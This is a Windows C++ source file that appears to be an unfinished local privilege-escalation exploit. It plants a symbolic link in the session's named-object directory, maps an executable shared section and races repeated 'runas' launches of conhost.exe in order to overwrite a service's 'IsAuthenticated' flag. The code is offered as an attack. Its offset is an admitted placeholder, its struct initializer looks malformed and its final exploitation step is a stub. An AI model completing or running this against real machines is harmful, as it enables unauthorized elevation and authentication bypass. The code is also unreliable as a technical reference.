#include <Windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI* _NtCreateSymbolicLinkObject)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING);
typedef NTSTATUS (NTAPI* _NtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);

volatile BOOL bKeepRunning = TRUE;

DWORD WINAPI TriggerRace(LPVOID lpParam) {
    SHELLEXECUTEINFO shi = { sizeof(shi), 0, NULL, L"runas", L"conhost.exe", L"", L"", SW_HIDE };
    while (bKeepRunning) {
        ShellExecuteEx(&shi);
        for (int i = 0; i < 50; i++) YieldProcessor();
    }
    return 0;
}

int wmain() {
    DWORD sessionId;
    ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);

    wchar_t linkPath[256];
    swprintf(linkPath, 256, L"\\Sessions\\%lu\\BaseNamedObjects\\TargetObj", sessionId);

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto NtCreateSymbolicLinkObject = (_NtCreateSymbolicLinkObject)GetProcAddress(ntdll, "NtCreateSymbolicLinkObject");
    auto NtOpenSection = (_NtOpenSection)GetProcAddress(ntdll, "NtOpenSection");

    HANDLE hLink = NULL, hSection = NULL, hMapping = NULL;
    UNICODE_STRING linkName, targetName;
    OBJECT_ATTRIBUTES objAttr;

    RtlInitUnicodeString(&linkName, linkPath);
    RtlInitUnicodeString(&targetName, L"\\BaseNamedObjects\\JoeyExploitSection");
    InitializeObjectAttributes(&objAttr, &linkName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NtCreateSymbolicLinkObject(&hLink, SYMBOLIC_LINK_ALL_ACCESS, &objAttr, &targetName);

    hSection = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, 0x1000, L"JoeyExploitSection");
    void* pSharedMemory = MapViewOfFile(hSection, FILE_MAP_ALL_ACCESS, 0, 0, 0);

    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
    CreateThread(NULL, 0, TriggerRace, NULL, 0, NULL);

    InitializeObjectAttributes(&objAttr, &targetName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    while (true) {
        if (NtOpenSection(&hMapping, SECTION_ALL_ACCESS, &objAttr) == 0) {
            // TARGETED ATTACK: Instead of a DACL, we overwrite the
            // service's "IsAuthenticated" boolean at a specific offset.
            // TODO: identify the exact offset via WinDbg — 0x42 is a placeholder.
            *((BYTE*)pSharedMemory + 0x42) = 0x01;
            bKeepRunning = FALSE;
            break;
        }
    }

    // [Davey-Approved Cleanup/Exploitation Logic Here]
    return 0;
}
